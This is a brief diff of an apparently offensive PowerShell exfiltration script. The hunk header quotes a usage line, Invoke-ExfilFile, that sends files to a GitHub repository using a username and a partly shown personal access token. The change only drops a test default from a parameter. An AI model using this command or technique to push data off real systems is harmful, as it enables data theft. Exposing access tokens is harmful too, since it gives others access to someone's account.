@@ -70,7 +70,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a237
 
         [Parameter(Mandatory = $False)]
         [String]
-        $data = "this is a test to see if i can update this"
+        $data
 
 
     )
